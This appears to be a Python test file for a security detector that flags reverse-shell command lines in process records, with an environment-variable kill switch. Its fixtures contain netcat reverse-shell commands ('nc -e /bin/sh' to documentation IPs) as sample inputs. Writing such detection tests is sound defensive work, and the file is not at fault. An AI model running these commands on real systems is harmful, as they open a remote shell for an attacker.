"""Wiring: the reverse-shell SHAPE detector reaches the disposition layer as a NON-WEAK,
registered, env-gated malicious-semantic signal.

Default OFF => byte-identical to baseline (the matcher returns False, nothing declares
the signal). With SIFT_C2_CMDLINE_CONFIRM=1 a process/powershell fact whose command line
is a reverse shell fires the matcher, so the existing confirm-eligibility gates can
promote a corroborated finding DETERMINISTICALLY. Universal: command-line grammar only.
"""
from sift_sentinel.analysis import malicious_semantics as ms
from sift_sentinel.analysis.disposition import _WEAK_ALONE_SEMANTIC_SIGNALS

# Synthetic values only (RFC-5737 documentation IP); no case IOC is hardcoded.
# Uses an UNAMBIGUOUS reverse-shell idiom (nc -e) -- the dual-use -l/-s/-k listen+endpoint
# shape is intentionally NOT confirm-grade (it FP's on F-Response/Velociraptor/PsExec).
REVSHELL_FACT = {"type": "process_fact", "process": "net_helper.exe",
                 "command_line": "net_helper.exe nc -e /bin/sh 203.0.113.7 1337"}
BENIGN_FACT = {"type": "process_fact", "process": "svchost.exe",
               "command_line": "C:\\Windows\\System32\\svchost.exe -k netsvcs"}


def test_signal_registered_and_non_weak():
    # registered so disposition recognises it, and NOT weak-alone (it is confirm-grade)
    assert "c2_reverse_shell_cmdline" in ms.MALICIOUS_SEMANTIC_SIGNALS
    assert "c2_reverse_shell_cmdline" not in _WEAK_ALONE_SEMANTIC_SIGNALS


def test_matcher_fires_by_default(monkeypatch):
    # like every registered matcher, it fires on a true positive with no env setup
    monkeypatch.delenv("SIFT_C2_CMDLINE_CONFIRM", raising=False)
    assert ms.match_c2_reverse_shell_cmdline(REVSHELL_FACT) is True
    # a benign service command line never fires
    assert ms.match_c2_reverse_shell_cmdline(BENIGN_FACT) is False


def test_kill_switch_disables_for_ab(monkeypatch):
    # SIFT_C2_CMDLINE_CONFIRM=0 falls back to pre-signal behavior (A/B rollback)
    monkeypatch.setenv("SIFT_C2_CMDLINE_CONFIRM", "0")
    assert ms.match_c2_reverse_shell_cmdline(REVSHELL_FACT) is False


def test_matcher_reads_raw_excerpt_carrier(monkeypatch):
    # the EvidenceDB typed-fact carries the cmdline inside raw_excerpt JSON
    import json
    monkeypatch.setenv("SIFT_C2_CMDLINE_CONFIRM", "1")
    fact = {"type": "process_fact",
            "raw_excerpt": json.dumps({"Cmd": "nc -e /bin/sh 203.0.113.5 4444"})}
    assert ms.match_c2_reverse_shell_cmdline(fact) is True


def test_declared_signal_recognised_when_present(monkeypatch):
    monkeypatch.setenv("SIFT_C2_CMDLINE_CONFIRM", "1")
    finding = {"malicious_semantic_signals": ["c2_reverse_shell_cmdline"]}
    ok, sigs = ms.has_malicious_semantic(finding)
    assert ok and "c2_reverse_shell_cmdline" in sigs
